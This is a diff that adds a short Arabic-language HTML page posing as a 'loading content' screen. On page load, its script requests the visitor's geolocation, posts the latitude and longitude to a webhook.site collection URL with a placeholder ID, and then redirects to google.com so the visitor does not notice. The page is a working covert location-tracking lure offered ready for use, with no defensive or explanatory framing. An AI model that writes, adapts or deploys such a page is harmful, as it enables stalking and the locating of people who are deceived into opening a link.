@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري التحميل...</title>
+</head>
+<body>
+    <h2>جاري تحميل المحتوى، يرجى الانتظار...</h2>
+
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("المتصفح لا يدعم تحديد الموقع.");
+            }
+        };
+
+        function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            fetch('https://webhook.site/YOUR-UNIQUE-ID', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude: lat, longitude: lon })
+            }).then(() => {
+                window.location.href = "https://www.google.com";
+            });
+        }
+
+        function showError(error) {
+            console.log("حدث خطأ أو تم رفض الإذن: " + error.message);
+        }
+    </script>
+</body>
+</html>
